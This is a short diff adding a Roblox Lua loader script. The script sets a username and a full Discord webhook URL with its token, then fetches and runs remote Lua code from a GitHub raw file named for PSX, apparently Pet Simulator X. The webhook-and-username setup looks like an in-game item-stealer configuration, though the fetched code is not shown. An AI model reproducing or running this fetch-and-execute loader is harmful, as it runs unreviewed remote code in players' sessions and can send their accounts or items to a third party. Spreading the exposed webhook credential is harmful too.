@@ -1,0 +1,4 @@
+UserName = "PUBG_ViRUS"
+WebHook = "https://discord.com/api/webhooks/1084486631446302750/D2-MKKD3oNzosB6blUqjt0dwk8byQeftR6Go-Oxr7fqOhKyO_XIGKpZDoD53CvDUZe71"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
